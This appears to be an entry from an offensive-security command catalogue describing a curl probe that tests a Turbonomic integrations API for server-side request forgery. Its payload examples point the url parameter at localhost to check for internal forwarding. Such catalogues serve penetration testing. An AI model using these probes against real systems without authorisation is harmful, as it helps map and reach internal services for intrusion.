---
id: cmd-curl-basic-probe
data: >-
  curl -X POST https://turbonomic.example.com/api/integrations -d
  'url=http://example.com' -v
tags:
  - recon
  - http-probe
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.577Z'
verified: false
validated: true
submitted: true
---
# curl-basic-probe

## Command

```bash
curl -X POST https://turbonomic.example.com/api/integrations -d 'url=http://example.com' -v
```

## Description

This command probes a web endpoint for SSRF susceptibility by sending a POST request with a URL parameter, using verbose mode to inspect headers and potential internal forwarding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `-d 'url=...'` | Data payload with URL | Yes |
| `-v` | Verbose output for debugging | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/api -d 'url=http://example.com' -v
```

### Advanced Usage

```bash
curl -X POST https://target.com/api -d 'url=http://localhost' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

## Expected Output

Verbose HTTP exchange, potentially showing connection to the supplied URL or errors indicating server-side request processing, e.g., "* Connected to localhost (127.0.0.1) port 80".

## Related

- [[Related Procedure: Identify Vulnerable Turbonomic Endpoint]]
